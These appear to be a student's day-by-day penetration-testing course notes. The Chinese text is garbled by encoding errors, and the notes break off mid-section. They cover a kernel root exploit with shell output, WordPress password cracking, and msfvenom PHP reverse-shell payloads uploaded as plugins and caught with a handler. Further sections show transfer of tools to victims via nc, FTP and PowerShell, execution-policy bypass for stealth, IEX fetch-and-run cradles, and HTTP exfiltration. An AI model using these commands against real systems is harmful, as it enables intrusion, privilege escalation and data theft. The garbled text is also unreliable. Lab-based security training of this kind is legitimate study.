Finding the OS and kernel version //æŸ¥æ‰¾OSå’Œå†…æ ¸çš„ç‰ˆæœ¬
Searching the Internet for flaws, if any //é€šè¿‡GoogleæŸ¥æ‰¾è¯¥ç‰ˆæœ¬çš„ç³»ç»Ÿæ˜¯å¦æœ‰æ¼æ´
Finding a few exploits
Cross-verifying with our available vectors //ä¸‹è½½å¯åˆ©ç”¨çš„æ¼æ´POC
All vectors compiled, so we downloaded and executed the Kernel exploit//å¯¹ç›®æ ‡é¶æœºè¿›è¡Œæ¼æ´åˆ©ç”¨

ubuntu 16.0.4 site:exploit-db.com
https://www.exploit-db.com/exploits/39772

searchsploit -m [EDB-ID] 
æ˜¾ç¤ºè¯¥ç¼–å·å¯¹åº”çš„URLï¼ˆç½‘å€ï¼‰
searchsploit -m 39772  

wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip

  

An exploit that puts all this together is in exploit.tar. Usage:

user@host:~/ebpf_mapfd_doubleput$ ./compile.sh
user@host:~/ebpf_mapfd_doubleput$ ./doubleput
starting writev
woohoo, got pointer reuse
writev returned successfully. if this worked, you'll have a root shell in <=60 seconds.
suid file detected, launching rootshell...
we have root privs now...
root@host:~/ebpf_mapfd_doubleput# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),999(vboxsf),1000(user)

This exploit was tested on a Ubuntu 16.04 Desktop system.

Fix: https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=8358b02bf67d3a5d8a825070e1aa73f25fb2e4c7

**Day68
 Cracking HTTP logins using custom wordlist
 68.1. å¯¹HTTPçš„ç™»å½•ç ´è§£
 
wpscan --url https://192.168.195.166:12380/blogblog/ -P /usr/share/wordlists/rockyou.txt -t 50 --disable-tls-checks

-t  åŒæ—¶è¿è¡Œçš„çº¿ç¨‹

 | Username: john, Password: incorrect


68.2. å¯¹Wordpressçš„åˆ©ç”¨ï¼ˆé«˜æƒé™çš„è´¦å·ï¼‰
å‰æï¼šé«˜æƒé™çš„è´¦å·ï¼ˆå¦‚å®‰è£…æ–°æ’ä»¶ã€ä¿®æ”¹æ¨¡æ¿ç­‰ï¼‰ï¼Œç±»ä¼¼äºæ‹¿åˆ°äº†ä¸€ä¸ªç½‘ç«™çš„ç®¡ç†åå°
wordpress åŸºäºPHPå¼€å‘çš„

å®‰è£…æ–°æ’ä»¶åŠŸèƒ½ä¸­--ä¸Šä¼ æ–‡ä»¶ï¼ˆï¼Ÿä¸€ä¸ªPHPçš„æœ¨é©¬ï¼‰

å¦‚ä½•åˆ¶ä½œä¸€ä¸ªPHPçš„æœ¨é©¬å‘¢ï¼Ÿ

msfvenom ä¸“é—¨åˆ¶ä½œæœ¨é©¬çš„å·¥å…·


msfvenom -p php/meterpreter_reverse_tcp  LHOST=192.168.195.9 LPORT=4444 -o shell.php
å®˜æ–¹
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe

step01: msfvenom -l payload
        msfvenom -l payload  | grep php

step02ï¼š msfvenom -p php/meterpreter/reverse_tcp --list-options 
æŸ¥çœ‹æŒ‡å®špayloadï¼ˆphp/meterpreter/reverse_tcpï¼‰æ‰€æ”¯æŒçš„é€‰é¡¹

msfvenom -p php/meterpreter/reverse_tcp --list-options                                                                                                              1 â¨¯
Options for payload/php/meterpreter/reverse_tcp:
=========================


       Name: PHP Meterpreter, PHP Reverse TCP Stager
     Module: payload/php/meterpreter/reverse_tcp
   Platform: PHP
       Arch: php
Needs Admin: No
 Total size: 1101
       Rank: Normal

Provided by:
    egypt <egypt@metasploit.com>

Basic options:
Name   Current Setting  Required  Description
----   ---------------  --------  -----------
LHOST                   yes       The listen address (an interface may be specified)
LPORT  4444             yes       The listen port

Step03
msfvenom -p php/meterpreter/reverse_tcp  LHOST=192.168.195.76 LPORT=4444 -f raw -o webshell.php

LHOST  ç›‘å¬ä¸»æœºçš„åœ°å€--æ§åˆ¶ç«¯ï¼ˆKaliçš„åœ°å€ï¼‰
LPORT  ç›‘å¬ç«¯å£--æ§åˆ¶ç«¯ç›‘å¬çš„ç«¯å£
-o æŒ‡å®šç”Ÿæˆçš„æ–‡ä»¶
-f ç”Ÿæˆçš„æ–‡ä»¶æ ¼å¼
	msfvenom  --list formats    //æŸ¥çœ‹æ‰€æ”¯æŒçš„æ ¼å¼
	
	rawï¼ˆéšæœºçš„ï¼‰æ ¹æ®payloadç±»å‹è‡ªåŠ¨é€‰æ‹©ç›¸åº”çš„æ–‡ä»¶æ ¼å¼


å®˜æ–¹
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe


### Da69
john/incorrect

1ã€åˆ¶ä½œæœ¨é©¬
msfvenom -p php/meterpreter/reverse_tcp  LHOST=192.168.195.76 LPORT=4444 -f raw -o webshell.php

2ã€ä¸Šä¼ æœ¨é©¬æ–‡ä»¶ï¼ˆå®‰è£…æ–°æ’ä»¶ï¼‰

æŸ¥çœ‹
https://192.168.195.166:12380/blogblog/wp-content/uploads/

3. åœ¨æ”»å‡»ç«¯ï¼ˆKaliï¼‰å»ºç«‹ä¸€ä¸ªä¾¦å¬å™¨ï¼ˆListenerï¼‰
å¸¸ç”¨çš„ä¸€ç§æ–¹æ³•ï¼š
ï¼ˆ1ï¼‰ä½¿ç”¨metasploitçš„exploit/multi/handleræ¨¡å—
 use exploit/multi/handler  //è°ƒç”¨æ¨¡å—
 é…ç½®æ¨¡å—é€‰é¡¹
 set payload php/meterpreter/reverse_tcp
 set lhost 192.168.195.76
 set lport 4444
 æ¼æ´åˆ©ç”¨
 exploit

ï¼ˆ2ï¼‰æ‹¿åˆ°äº†Meterpreterä¼šè¯
Meterpreteræ˜¯ä¸€ç§ä½¿ç”¨å†…å­˜æŠ€æœ¯çš„æ”»å‡»è½½è·ï¼Œ å¯ä»¥æ³¨å…¥åˆ°è¿›ç¨‹ä¹‹ä¸­ã€‚ å®ƒæä¾›äº†å„ç§å¯ä»¥åœ¨ç›®æ ‡ä¸Šæ‰§è¡Œçš„åŠŸèƒ½ï¼Œ ä»è€Œæˆä¸ºäº†æœ€å—æ¬¢è¿çš„æ”»å‡»è½½è·ã€‚
meterpreter > ä¸­çš„å‘½ä»¤
1ï¼‰sysinfo æŸ¥çœ‹ç›®æ ‡ç³»ç»Ÿä¿¡æ¯
2ï¼‰shell è·å–ç›®æ ‡ç³»ç»Ÿçš„shell

ï¼ˆ3ï¼‰è·å–äº¤äº’å¼shell
python -c 'import pty;pty.spawn("/bin/bash")'

æ€è€ƒï¼šåˆ©ç”¨Webç¨‹åºçš„æ¼æ´getshellï¼Œè¿™ä¸ªshellé€šå¸¸åªèƒ½æ˜¯æ™®é€šï¼ˆç¨‹åºï¼‰ç”¨æˆ·çš„æƒé™

4. åæ¸—é€åˆ©ç”¨ï¼ˆ post-exploitationï¼‰æ˜¯æŒ‡æ”»å‡»è€…åœ¨è·å¾—å¯¹ç›®æ ‡çš„æŸç§ç¨‹åº¦æ§åˆ¶åæ‰€æ‰§è¡Œçš„æ“ä½œã€‚ä¸€äº›ååˆ©ç”¨è¡ŒåŠ¨åŒ…æ‹¬æå‡ç‰¹æƒï¼Œæ‰©å¤§æ§åˆ¶åˆ°å…¶ä»–æœºå™¨ï¼Œå®‰è£…åé—¨ï¼Œæ¸…ç†æ”»å‡»è¯æ®ï¼ˆç—•è¿¹ï¼‰ï¼Œä¸Šä¼ æ–‡ä»¶å’Œå·¥å…·åˆ°ç›®æ ‡æœºå™¨ï¼Œç­‰ç­‰ã€‚

åæ¸—é€é˜¶æ®µ--æ–‡ä»¶ä¼ è¾“
å¦‚ä¸Šä¼ ä¸€ä¸ªæ”»å‡»å·¥å…·ã€åé—¨ã€POCç­‰
æ–¹æ³•1ï¼š æ­å»ºä¸€ä¸ªç®€æ˜“çš„HTTPæœåŠ¡å™¨
 python -m SimpleHTTPServer 8086
 ç›®æ ‡ï¼šwget http://192.168.195.76:8086/39772.zip
æ–¹æ³•2ï¼šåˆ©ç”¨ncä¼ è¾“æ–‡ä»¶

Kali  nc -nvlp 12306 < 39772.zip   
ç›®æ ‡  nc -nv 192.168.195.76 12306 > 39772-2.zip

md5sum 39772-2.zip

### ### Day70
æ–¹æ³•3ï¼š ä½¿ç”¨FTPæœåŠ¡è¿›è¡Œæ–‡ä»¶çš„ä¸Šä¼ 



Step01 å®‰è£… é…ç½®Pure-FTPd

apt install pure-ftpd


é…ç½®è„šæœ¬

#!/bin/bash
//åˆ›å»ºç»„å’Œç³»ç»Ÿç”¨æˆ·
groupadd ftpgroup  
useradd -g ftpgroup -d /dev/null -s /bin/false ftpuser
-g æŒ‡å®šå±ç»„  -d  æŒ‡å®šå®¶ç›®å½•  -s æŒ‡å®šç™»å½•shell
pure-pw useradd offsec -u ftpuser -d /ftphome
//åˆ›å»ºè™šæ‹Ÿç”¨æˆ·offsec,æ˜ å°„åˆ°ftpuserè¿™ä¸ªç³»ç»Ÿç”¨æˆ· -d  æŒ‡å®šç”¨æˆ·çš„FTPä¸»ç›®å½•
pure-pw mkdb
//åˆ›å»ºå’Œæ›´æ–°è™šæ‹Ÿè´¦å·æ•°æ®åº“
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
//æ”¯æŒè™šæ‹Ÿè´¦å·æ•°æ®åº“å¯¹ftpç”¨æˆ·åšè®¤è¯
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
//åˆ›å»ºç”¨æˆ·çš„FTPä¸»ç›®å½•å¹¶æˆæƒ
systemctl restart pure-ftpd


ps:dos2unix 

æŠŠWindowsä¸‹çš„æ–‡æœ¬æ ¼å¼è½¬æ¢æˆLinuxæ ¼å¼çš„æ–‡æœ¬
æŸ¥çœ‹æ¢è¡Œç¬¦
cat -A
vi -b   

### ### Day71
ä½¿ç”¨FTPè¿›è¡Œæ–‡ä»¶ä¸‹è½½/ä¸Šä¼ 

åœºæ™¯1ï¼šThe Non-Interactive Shellï¼ˆéäº¤äº’å¼shellï¼‰

ï¼ˆ1ï¼‰éäº¤äº’å¼çš„å‘½ä»¤ç¨‹åºæ—¶å¦‚lsã€ip aæ²¡æœ‰é—®é¢˜

ï¼ˆ2ï¼‰æ‰§è¡Œ--äº¤äº’å¼çš„å‘½ä»¤ç¨‹åº ftpã€suã€ sudo

è§£å†³æ–¹æ³•ï¼šå‡çº§éäº¤äº’å¼çš„shell---ã€‹äº¤äº’å¼çš„shell

Pythonè§£é‡Šå™¨é€šå¸¸å®‰è£…åœ¨Linuxç³»ç»Ÿä¸Šï¼Œå®ƒå¸¦æœ‰ä¸€ä¸ªåä¸ºptyçš„æ ‡å‡†æ¨¡å—ï¼Œå…è®¸åˆ›å»ºä¼ªç»ˆç«¯ã€‚
é€šè¿‡ä½¿ç”¨è¿™ä¸ªæ¨¡å—ï¼Œæˆ‘ä»¬å¯ä»¥ä»è¿œç¨‹shellä¸­ç”Ÿæˆä¸€ä¸ªç‹¬ç«‹çš„è¿›ç¨‹ï¼Œå¹¶è·å¾—ä¸€ä¸ªå®Œå…¨äº¤äº’å¼çš„shell

å‘½ä»¤ï¼špython -c 'import pty; pty.spawn("/bin/bash")'


åœºæ™¯2ï¼šTransferring Files with Windows Hosts
åœ¨Windowsä¸»æœºä¸Šè¿›è¡Œæ–‡ä»¶ä¼ è¾“

Linuxæä¾›äº†ä¸€äº›æ–‡ä»¶ä¼ è¾“çš„å®¢æˆ·ç«¯å·¥å…·å¦‚nc ã€curl ã€wgetç­‰

ï¼ˆ1ï¼‰wget 
   -O,  --output-document=æ–‡ä»¶      å°†æ–‡æ¡£å†™å…¥ FILE
ï¼ˆ2ï¼‰curl 
   -o, --output <file>  Write to file instead of stdout
   curl -o exe2bat.exe  http://192.168.195.76:8089/exe2bat.exe
ï¼ˆ3ï¼‰ä½¿ç”¨ncä¼ è¾“æ–‡ä»¶

76ï¼ˆwhoami.exeï¼‰----ã€‹9

æ¥æ”¶ç«¯ï¼ˆncæœåŠ¡ç«¯ï¼‰9
	nc  -lnvp 12306 >whoami.exe

å‘é€ç«¯ï¼ˆncå®¢æˆ·ç«¯ï¼‰76
   nc  -nv  192.168.195.9 12306 < whoami.exe -q 1

åœºæ™¯2.1.  Non-Interactive FTP Download---éäº¤äº’å¼ftpä¸‹è½½
æ–¹æ³•ï¼šftp
 -s:filename     æŒ‡å®šåŒ…å« FTP å‘½ä»¤çš„æ–‡æœ¬æ–‡ä»¶ï¼›
                 å‘½ä»¤åœ¨ FTP å¯åŠ¨åè‡ªåŠ¨è¿è¡Œã€‚

### Day72
nmap -sS -Pn -n -A x.x.x.x
Windowsä¸»æœºå¦‚ä½•å®ç°ftpéäº¤äº’å¼çš„ä¸‹è½½

1ã€å‡†å¤‡å¥½ftpæœåŠ¡
systemctl start pure-ftpd
2ã€ç†è§£ftpå®¢æˆ·ç«¯ç¨‹åºçš„æ“ä½œ

  -v              ç¦æ­¢æ˜¾ç¤ºè¿œç¨‹æœåŠ¡å™¨å“åº”ã€‚
  -n              ç¦æ­¢åœ¨åˆå§‹è¿æ¥æ—¶è‡ªåŠ¨ç™»å½•ã€‚
  -i              å…³é—­å¤šæ–‡ä»¶ä¼ è¾“è¿‡ç¨‹ä¸­çš„
                  äº¤äº’å¼æç¤ºã€‚
  -d              å¯ç”¨è°ƒè¯•ã€‚
  -g              ç¦ç”¨æ–‡ä»¶åé€šé…(è¯·å‚é˜… GLOB å‘½ä»¤)ã€‚
  -s:filename     æŒ‡å®šåŒ…å« FTP å‘½ä»¤çš„æ–‡æœ¬æ–‡ä»¶ï¼›å‘½ä»¤
                  åœ¨ FTP å¯åŠ¨åè‡ªåŠ¨è¿è¡Œã€‚
  -a              åœ¨ç»‘å­—æ•°æ®è¿æ¥æ—¶ä½¿ç”¨æ‰€æœ‰æœ¬åœ°æ¥å£ã€‚
  -A              åŒ¿åç™»å½•ã€‚
  -x:send sockbuf è¦†ç›–é»˜è®¤çš„ SO_SNDBUF å¤§å° 8192ã€‚
  -r:recv sockbuf è¦†ç›–é»˜è®¤çš„ SO_RCVBUF å¤§å° 8192ã€‚
  -b:async count  è¦†ç›–é»˜è®¤çš„å¼‚æ­¥è®¡æ•° 3
  -w:windowsize   è¦†ç›–é»˜è®¤çš„ä¼ è¾“ç¼“å†²åŒºå¤§å° 65535ã€‚
  host            æŒ‡å®šä¸»æœºåç§°æˆ–è¦è¿æ¥åˆ°çš„è¿œç¨‹ä¸»æœº
                  çš„ IP åœ°å€ã€‚


FTP*****èµ„æ–™è¡¥å……
1971å¹´ï¼ŒRFC114æ–‡æ¡£å®šä¹‰äº†FTPåè®®çš„æœ€åˆç‰ˆæœ¬ã€‚1985å¹´ï¼ŒRFC959æ–‡æ¡£å®šä¹‰äº†FTPåè®®çš„æ–°ç‰ˆæœ¬ï¼Œå®ƒæ˜¯ç›®å‰FTPæœåŠ¡ä»éµå¾ªçš„åè®®æ ‡å‡†ã€‚

FTPå‘½ä»¤ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼šå‘½ä»¤åä¸å‚æ•°
FTPå“åº”ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼šå“åº”ç ä¸æè¿°ä¿¡æ¯
â€œ2xxâ€è¡¨ç¤ºå‘½ä»¤å·²ç»å®Œæˆï¼Œå¯ä»¥è¿›è¡Œä¸‹ä¸€ä¸ªå‘½ä»¤ï¼›â€œ3xxâ€è¡¨ç¤ºå‘½ä»¤å·²ç»æ¥å—ï¼Œéœ€è¦æä¾›è¿›ä¸€ æ­¥çš„ä¿¡æ¯ï¼›â€œ4xxâ€è¡¨ç¤ºå‘½ä»¤æ— æ³•å®Œæˆï¼Œä½†æ˜¯å¯ä»¥å†æ¬¡å‘é€è¯¥å‘½ä»¤ï¼›â€œ5xxâ€è¡¨ç¤ºå‘½ä»¤æ— æ³•å®Œæˆï¼Œå¹¶ä¸”ä¸è¦å†æ¬¡å‘é€è¯¥å‘½ä»¤

ftp> ?
å‘½ä»¤ï¼š
open ä¸»æœº  é€šè¿‡ftpåè®®è¿æ¥åˆ°æŒ‡å®šçš„ä¸»æœº
user ç”¨æˆ·å  å‡ºå…·ç”¨æˆ·å
binary  æŠŠä¼ è¾“æ¨¡å¼æ”¹ä¸ºäºŒè¿›åˆ¶æ¨¡å¼ï¼Œé€šå¸¸åœ¨ä¼ è¾“ç¨‹åºæ–‡ä»¶æ—¶ä½¿ç”¨
ascii   é»˜è®¤çš„ä¼ è¾“æ¨¡å¼ï¼Œé€‚ç”¨äºæ–‡æœ¬ä¼ è¾“
get   ä¸‹è½½
put    ä¸Šä¼ 
bye  ç¦»å¼€


echo open 192.168.195.76 21> ftp.txt
echo USER offsec>> ftp.txt
echo xiao>> ftp.txt
echo bin >> ftp.txt
echo GET whoami.exe >> ftp.txt
echo bye >> ftp.txt

ftp -v -n -s:ftp.txt

3ã€


Windows Downloads Using Scripting Languages

ä½¿ç”¨Windowsè„šæœ¬è¯­è¨€æ¥å®ç°éäº¤äº’å¼ä¸‹è½½

ï¼ˆ1ï¼‰VBScript 
   å¯ä»¥å®ç°å¯¹Windowsç³»ç»Ÿçš„ç®¡ç†å’Œæ§åˆ¶
   ç‰¹åˆ«é€‚ç”¨äºæ—©æœŸçš„Windows ç³»ç»Ÿå¦‚ï¼ˆxpã€2003ï¼‰
VBScript ("Microsoft Visual Basic Scripting Edition") is an Active Scripting language developed by Microsoft that is modeled on Visual Basic. It allows Microsoft Windows system administrators to generate powerful tools for managing computers with error handling, subroutines, and other advanced programming constructs. It can give the user complete control over many aspects of their computing environment. 

ï¼ˆ2ï¼‰å‘½ä»¤
C:\exam2>cscript /?   æ‰§è¡ŒWindowsçš„è„šæœ¬å¦‚vbè„šæœ¬
Microsoft (R) Windows Script Host Version 5.8
ç‰ˆæƒæ‰€æœ‰(C) Microsoft Corporationã€‚ä¿ç•™æ‰€æœ‰æƒåˆ©ã€‚

ç”¨æ³•ï¼šCScript scriptname.extension [option...] [arguments...]

é€‰é¡¹ï¼š
 //B         æ‰¹æ¨¡å¼ï¼šä¸æ˜¾ç¤ºè„šæœ¬é”™è¯¯åŠæç¤ºä¿¡æ¯
 //D         å¯ç”¨ Active Debugging
 //E:engine  ä½¿ç”¨æ‰§è¡Œè„šæœ¬çš„å¼•æ“
 //H:CScript å°†é»˜è®¤çš„è„šæœ¬å®¿ä¸»æ”¹ä¸º CScript.exe
 //H:WScript å°†é»˜è®¤çš„è„šæœ¬å®¿ä¸»æ”¹ä¸º WScript.exe ï¼ˆé»˜è®¤ï¼‰
 //I         äº¤äº’æ¨¡å¼ï¼ˆé»˜è®¤ï¼Œä¸ //B ç›¸å¯¹)
 //Job:xxxx  æ‰§è¡Œä¸€ä¸ª WSF å·¥ä½œ
 //Logo      æ˜¾ç¤ºå¾½æ ‡ï¼ˆé»˜è®¤ï¼‰
 //Nologo    ä¸æ˜¾ç¤ºå¾½æ ‡ï¼šæ‰§è¡Œæ—¶ä¸æ˜¾ç¤ºæ ‡å¿—
 //S         ä¸ºè¯¥ç”¨æˆ·ä¿å­˜å½“å‰å‘½ä»¤è¡Œé€‰é¡¹
 //T:nn      è¶…æ—¶è®¾å®šç§’ï¼šå…è®¸è„šæœ¬è¿è¡Œçš„æœ€é•¿æ—¶é—´
 //X         åœ¨è°ƒè¯•å™¨ä¸­æ‰§è¡Œè„šæœ¬
 //U         ç”¨ Unicode è¡¨ç¤ºæ¥è‡ªæ§åˆ¶å°çš„é‡å®šå‘ I/O


ï¼ˆ3ï¼‰ç¯å¢ƒå‡†å¤‡
cd /usr/share/windows-binaries
python3 -m http.server 8089


ï¼ˆ4ï¼‰

cscript wget.vbs http://192.168.195.76:8089/whoami.exe whoami.exe



### Day73
é€šè¿‡Powershellå®ç°ä¸€ä¸ªç®€æ˜“çš„Webå®¢æˆ·ç«¯å®ç°httpä¸‹è½½

73.1. Powershellæ¦‚è¿°

PowerShell is a cross-platform task automation solution made up of a command-line shell, a scripting language, and a configuration management framework. PowerShell runs on Windows, Linux, and macOS.

PowerShell is a powerful tool for penetration testing
PowerShellåŒæ—¶ä¹Ÿæ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„æ¸—é€æµ‹è¯•å·¥å…·

Win+x

PowerShellåŒ…å«ä¸€ä¸ªå†…ç½®çš„é›†æˆå¼€å‘ç¯å¢ƒ(IDE)ï¼Œç§°ä¸ºWindows PowerShellé›†æˆè„šæœ¬ç¯å¢ƒ(ISE) ISEæ˜¯ä¸€ä¸ªç”¨äºWindows PowerShellçš„ä¸»æœºåº”ç”¨ç¨‹åºï¼Œå®ƒä½¿æˆ‘ä»¬èƒ½å¤Ÿåœ¨ä¸€ä¸ªåŸºäºWindowsçš„å›¾å½¢ç”¨æˆ·ç•Œé¢ä¸­è¿è¡Œå‘½ä»¤ã€ç¼–å†™ã€æµ‹è¯•å’Œè°ƒè¯•è„šæœ¬ã€‚è¯¥ç•Œé¢æä¾›äº†å¤šè¡Œç¼–è¾‘ã€åˆ¶è¡¨ç¬¦è¡¥å…¨ã€è¯­æ³•ç€è‰²ã€é€‰æ‹©æ€§æ‰§è¡Œã€ä¸Šä¸‹æ–‡æ•æ„Ÿå¸®åŠ©ã€

73.2. Powershellæ‰§è¡Œç­–ç•¥

73.3. PowerShell File Transfers

ç¯å¢ƒå‡†å¤‡
cd /usr/share/windows-binaries
python3 -m http.server 8089

 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.195.76:8089/wget.exe','C:\exam6\wget.exe')"

å‘½ä»¤çš„åˆ†è§£ï¼š
powershell -c "å‘½ä»¤"
-c é€‰é¡¹
è¿™å°†æ‰§è¡Œæ‰€æä¾›çš„å‘½ä»¤(ç”¨åŒå¼•å·æ‹¬èµ·æ¥)ï¼Œå°±åƒåœ¨PowerShellæç¤ºç¬¦ä¸­è¾“å…¥ä¸€æ ·ã€‚



ç›¸å…³ç½‘å€
1. https://docs.microsoft.com/zh-cn/powershell/scripting/developer/cmdlet/cmdlet-overview?view=powershell-7.2

2.

https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=netframework-4.7.2

3.
https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=netframework-4.7.2

4.https://docs.microsoft.com/en-us/dotnet/api/system.net?view=netframework-4.7.2

5. https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7.2

6. https://github.com/rezaduty/cybersecurity-career-path

7.https://github.com/ivan-sincek/wifi-penetration-testing-cheat-sheet

8. https://blog.csdn.net/qq_27446553/article/details/73635429







### Day74
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.195.76:8089/wget.exe','C:\exam6\wget.exe')"


Step01-Kali
cd /usr/share/windows-binaries
python3 -m http.server 8089
Step02 Windows ï¼ˆ2012 æˆ– 10 ï¼‰
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://192.168.195.76:8089/whoami.exe" >>wget.ps1
echo $file = "whoami.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.195.76:8089/wget.exe','C:\exam6\wget.exe')"

Step03:
mkdir tools
cd tools
å»ºè®®æŠŠPowershellçš„æ‰§è¡Œç­–ç•¥æ›´æ”¹ä¸ºé»˜è®¤çš„å—é™
get-ExecutionPolicy
Set-ExecutionPolicy restricted
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
-ExecutionPolicy Bypass  ç»•è¿‡é»˜è®¤çš„å—é™ç­–ç•¥
-NoLogo éšè—Powershellçš„bannerä¿¡æ¯
-NonInteractive æŠ‘åˆ¶powershellçš„äº¤äº’å¼æç¤ºç¬¦
ä¸Šè¿°ä¸¤ä¸ªé€‰é¡¹çš„ç›®çš„å°±æ˜¯ä½¿è„šæœ¬åœ¨è¿è¡Œæ—¶æ›´éšè”½
-NoProfile ä¸è½½å…¥powershellçš„é»˜è®¤é…ç½®æ–‡ä»¶ï¼ˆéå¿…éœ€ï¼‰
-File æŒ‡å®šä½ çš„è„šæœ¬æ–‡ä»¶

74.2. Powershellè„šæœ¬ä¹Ÿå¯ä»¥è¿œç¨‹æ‰§è¡Œ
å¦‚æœæˆ‘ä»¬æƒ³ä¸‹è½½å¹¶æ‰§PowerShellè„šæœ¬è€Œä¸å°†å…¶ä¿å­˜åˆ°ç£ç›˜


powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')

Invoke-Expression å‘½ä»¤ ç®€å†™ä¸ºIEXï¼Œä½œç”¨ è¿è¡Œè¡Œä¸€ä¸ªä»¥å­—ç¬¦ä¸²å½¢å¼æä¾›çš„ Windows PowerShell è¡¨è¾¾å¼
DownloadStringæ–¹æ³•ï¼šæŠŠä¸‹è½½çš„æ–‡ä»¶è§£æä¸ºå­—ç¬¦ä¸²



https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invokeexpression?view=powershell-6

æ¡ˆä¾‹æ¼”ç¤º
Step01:
echo 'Write-Output "Hello World" ' >helloworld.ps1

Step02:
python3 -m http.server 8089
Step03:

powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.195.76:8089/helloworld.ps1')



Step01: ä½¿ç”¨8086æ¨¡æ‹Ÿgithubç­‰æä¾›è„šæœ¬çš„ç«™ç‚¹
å…ˆæŠŠwget.ps1è„šæœ¬æ”¾åœ¨8086çš„ç«™ç‚¹æœåŠ¡å™¨å†…
è„šæœ¬å†…å®¹
$webclient = New-Object System.Net.WebClient 
$url = "http://192.168.195.76:8089/whoami.exe" 
$file = "whoami.exe" 
$webclient.DownloadFile($url,$file) 

python3 -m http.server 8086


Step02 å†å¼€ä¸€ä¸ªç«™ç‚¹8089ï¼ˆæ¨¡æ‹Ÿé»‘å®¢æä¾›çš„å·¥å…·å¦‚whoamiç«™ç‚¹)

python3 -m http.server 8089
Step03 
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.195.76:8086/wget.ps1')
â€˜
'
### Day75
Powershellè„šæœ¬çš„è¿œç¨‹æ‰§è¡Œæ¡ˆä¾‹3

Invoke-ARPScan --ARPæ‰«æ

powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).Downloadstring('http://192.168.195.76:8086/Invoke-ARPScan.ps1');Invoke-ARPScan -CIDR 192.168.195.0/24"


75.2. è¿‚å›ä¸‹è½½

ä»æˆ‘ä»¬çš„Kaliæœºå™¨å¼€å§‹ï¼Œæˆ‘ä»¬å°†

1. å‹ç¼©æˆ‘ä»¬æƒ³è¦ä¼ è¾“çš„äºŒè¿›åˆ¶æ–‡ä»¶
å·¥å…·ï¼šupx
	  upxï¼Œä¸€ä¸ªå¯æ‰§è¡Œç¨‹åºçš„åŒ…è£…å™¨(ä¹Ÿç§°ä¸ºPEå‹ç¼©å·¥å…·)

2. å°†å…¶è½¬æ¢ä¸ºåå…­è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œå¹¶å°†å…¶åµŒå…¥åˆ°ä¸€ä¸ªWindowsè„šæœ¬ä¸­
exe2hex  æŠŠç¨‹åºæ–‡ä»¶æ¢ä¸ºåå…­è¿›åˆ¶å­—ç¬¦ä¸²
exe2hex -x nc.exe -p nc.cmd   

3. æ–‡ä»¶æ£€éªŒå·¥å…·ï¼ˆhashå€¼è®¡ç®—å·¥å…·ï¼‰
certutil ï¼ˆWindowså¹³å°ï¼‰
-hashfile         -- é€šè¿‡æ–‡ä»¶ç”Ÿæˆå¹¶æ˜¾ç¤ºåŠ å¯†å“ˆå¸Œ
md5sum  ï¼ˆLinuxå¹³å°ï¼‰
sha*

[LAB]
FTPæœåŠ¡å¯åŠ¨äº†
æŠŠé€šè¿‡upxå¤„ç†çš„ncæ”¾åœ¨FTPçš„å®¶ç›®å½•
åœ¨Windowsç«¯
ï¼ˆ1ï¼‰ä½¿ç”¨ftpçš„asciiä¼ è¾“æ¨¡å¼ä¸‹è½½nc
     1ï¼‰æ ¡éªŒhashå€¼-ä¸ä¸€æ ·
	 2ï¼‰è¿è¡Œnc-ä¸èƒ½è¿è¡Œ
ï¼ˆ2ï¼‰ä½¿ç”¨ftpçš„binaryä¼ è¾“æ¨¡å¼ä¸‹è½½nc
	1ï¼‰æ ¡éªŒhashå€¼-ä¸€æ ·
	2ï¼‰è¿è¡Œnc-èƒ½è¿è¡Œ
		è¯´æ˜binaryä¼ è¾“æ¨¡å¼--ç¨‹åºæ–‡ä»¶æ—¶
		    upxå¤„ç†ä¹‹åçš„ç¨‹åºå˜å°äº†ï¼Œä½†ä¾ç„¶èƒ½æ­£å¸¸è¿è¡Œ


### Day76

Windows Uploads Using Windows Scripting Languages
Windowsä¸»æœºä½¿ç”¨Windowsè„šæœ¬è¯­è¨€å®ç°æ–‡ä»¶çš„ä¸Šä¼ ï¼Œä»¥å¯¼å‡ºå®¢æˆ·ç«¯çš„æ•°æ®

åœºæ™¯ï¼šå¹¸è¿çš„æ˜¯ï¼Œé€šå¸¸HTTPé€šä¿¡ï¼ˆå‡ºç«™ï¼‰éƒ½æ˜¯è¢«å…è®¸çš„
æ–¹æ³•ï¼šä½¿ç”¨System.Net.WebClient PowerShellç±»é€šè¿‡HTTP POSTè¯·æ±‚å°†æ•°æ®ä¸Šä¼ åˆ°æˆ‘ä»¬çš„Kaliæœºå™¨

Step01: åœ¨Kaliç«¯æ¶è®¾ä¸€ä¸ªWebæœåŠ¡å™¨ï¼ˆLAMPï¼‰

systemctl start apache2

Step02 è¿›å…¥åˆ°/var/www/html ç›®å½•
å†™å…¥ä¸€ä¸ªä¸Šä¼ é¡µé¢å¦‚upload.php
<?php
